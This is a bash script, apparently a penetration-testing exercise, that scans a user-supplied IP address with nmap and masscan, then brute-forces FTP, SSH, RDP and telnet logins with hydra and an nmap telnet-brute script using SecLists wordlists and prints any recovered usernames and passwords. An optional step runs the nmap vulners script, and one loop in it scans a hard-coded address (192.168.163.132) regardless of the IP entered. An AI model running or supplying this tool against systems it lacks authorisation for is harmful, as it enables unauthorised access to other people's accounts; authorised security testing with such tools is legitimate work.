#!/bin/bash

#gather user input for network to scan
#while loop with regex is used as input validation for users to input blocks of digits separated by '.'
read -p 'Please key in an IP address to scan: ' ipadd

while [[ ! $ipadd =~ [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]
do
    read -p "Please key in a valid IP address: " ipadd
done

#while loop is used as input validation for users to input an existing directory in the user's machine
while :
do
    read -p 'Please key in the absolute path to save your scanned results: ' outputdir
    if [[ -d $outputdir ]]
    then
        cd $outputdir
        break
    else
        echo "Directory does not exists, please try again."
    fi
done

#gather user input for basic or full scan on network
read -p "Please choose either a basic or full scan [basic/full]: " scantype

#while loop is used as input validation for users to input only 'basic' or 'scan' strings
while [[ $scantype != 'basic' && $scantype != 'full' ]]
do
    read -p "Please key in only 'basic' or 'full': " scantype
done

echo

#run basic scan using nmap for tcp ports and masscan for udp ports
#nmap is further used for udp ports to get the service versions
echo "Scanning $ipadd for ports and services..."
echo
sudo nmap -sV -p- $ipadd > tcpsvscan.txt 2>&1
sudo masscan -pU:1-1000 $ipadd  > udpscan.txt 2>&1

#regex used to extract open udp port numbers
#for loop is used to run nmap on multiple open udp ports
udpmasscan=$(grep -Po "(?<=open\sport\s)(.*?)(?=\/udp)" udpscan.txt)
for eachport in $udpmasscan
do
    sudo nmap -sU -sV -p$eachport $ipadd >> udpsvscan.txt 2>&1
done

#check for seclists installation
#seclists installed if it is not found on user machine
echo "Checking if seclists is installed on your machine..."
sleep 2
sudo updatedb
if [[ $(locate seclists) == *"/usr/share/seclists"* ]]
then
    echo "Seclists is installed on your machine."    
else
    echo "Installing Seclists on your machine..."
    sudo apt-get update > /dev/null
    sudo apt-get -y install seclists > /dev/null
    echo "Seclist installation complete."
fi

echo

#let user choose password list to use for brute force attack
#while loop and if statements used as input validation for user to input either 'y' or 'n'
while :
do
    read -p "Please choose if you want to use your own password list for brute force attack [y/n]: " pwlist
    if [[ $pwlist == 'y' ]]
    then
        read -p "Please give the absolute path for your preferred password list: " pwpath
        pwfile=$(find "$pwpath")
        if [[ "$pwfile" ]]
        then
            echo "$pwpath selected."
            echo
            sleep 2
            break
        else
            echo "$pwpath is invalid."
        fi
    elif [[ $pwlist == 'n' ]]
    then
        pwpath=/usr/share/seclists/Passwords/darkweb2017-top10.txt
        echo "Default $pwpath used."
        echo
        sleep 2
        break
    else
        echo "Incorrect input."
    fi
done

echo "Scanning $ipadd for weak passwords..."
echo

#function checks if each port is open and then brute forces each port using hydra
#arg passed to choose the port and the login credentials are extracted using regex
bruteport () {
if [[ $(cat tcpsvscan.txt) == *"open  $1"* ]]
then
    echo "Commencing brute force attack on $1..."
    hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P $pwpath $ipadd $1 > hydra$1.txt 2>&1
    if [[ $(cat hydra$1.txt) == *"login: "* ]]
    then
        echo "Brute force attack successful."
        sleep 2
        echo "The $1 login name(s):"
        echo "$(grep -Po '(?<=login\:\s)(.*?)(?=\s\s\spassword)' hydra$1.txt)"
        sleep 2
        echo "The corresponding $1 password(s):"
        echo "$(grep -Po '(?<=password\:\s).*' hydra$1.txt)"
        sleep 2
    else
        echo "Brute force attack failed."
        sleep 2
    fi
else
echo "The $1 port is not open."
sleep 2
fi
echo
}

bruteport ftp
bruteport ssh
bruteport rdp

#For brute force of Telnet port, NSE script is used instead
if [[ $(cat tcpsvscan.txt) == *"open  telnet"* ]]
then
    echo "Commencing brute force attack on telnet..."
    sudo nmap --script-updatedb > /dev/null
    nmap -p23 --script telnet-brute --script-args \
    userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=$pwpath,telnet-brute.timeout=8s $ipadd > nsetelnet.txt 2>&1
    if [[ $(cat nsetelnet.txt) == *"Valid credentials"* ]]
    then
        echo "Brute force attack successful."
        sleep 2
        echo "The login credentials are:"
        echo "$(grep -Po '(?<=\|\s\s\s\s\s)(.*?)(?=\s\-\sValid)' nsetelnet.txt)"
    else
        echo  "Brute force attack failed."
    fi
else
    echo "The telnet port is not open."
    sleep 2
fi

#if user chose full scan, run NSE vulners script to check for vulnerabilities
#results of vulnerabilities are summarised into another text file to show only the open ports and all enumerated CVEs related to each port
if [[ $scantype == 'full' ]]
then
    echo
    echo "Scanning $ipadd ports for vulnerabilities..."
    nmap -sV --script vulners $ipadd > vuln.txt
    grep -Ei ' open  |cve' vuln.txt > vulnsummary.txt
    read -p "Please select the service with vulnerabilities that you would like to search for: " readvuln0
    readvuln=${readvuln0,,}
    grep $readvuln vuln.txt | cut -f 1 -d ' '| grep '[0-9]' | awk -F/ '{print$1}' >> vulnport.txt
    sleep 2

    for number in $(cat vulnport.txt)
    do
        nmap -sV --script vulners 192.168.163.132 -p$number | grep -Ei " $readvuln |cve" >> vuln$readvuln.txt
    done

    if [[ $(cat vuln$readvuln.txt) == *" $readvuln "* ]]
    then
        echo "Vulnerabilities in $readvuln have been found."
        sleep 2
        echo
        cat vuln$readvuln.txt
        sleep 2
        echo
        echo "Your search results have been saved in vuln$readvuln.txt."
        sleep 2
    else
        echo "No vulnerabilities have been found in $readvuln."
        sleep 2
    fi
fi

echo

#all results are saved into the networkvuln.zip file and all other working files in the output directory are removed
zip -m networkvuln.zip tcpsvscan.txt udpscan.txt udpsvscan.txt hydraftp.txt hydrassh.txt \
hydrardp.txt nsetelnet.txt vuln.txt vulnsummary.txt vuln$readvuln.txt > /dev/null

echo "All results are saved in 'networkvuln.zip' file."
sleep 2
echo "You may retrieve the service versions of the respective tcp and udp ports from tcpsvscan.txt and udpsvscan.txt in the zip file."
sleep 4
echo "You may retrieve the weak passwords of the respective ports (if any) from hydraftp.txt, hydrassh.txt, hydrardp.txt and nsetelnet.txt in the zip file."

if [[ $scantype == 'full' ]]
then
    rm vulnport.txt
    sleep 4
    echo "You may retrieve the respective complete and summarised vulnerabilities (if any) from vuln.txt and vulnsummary.txt in the zip file."
fi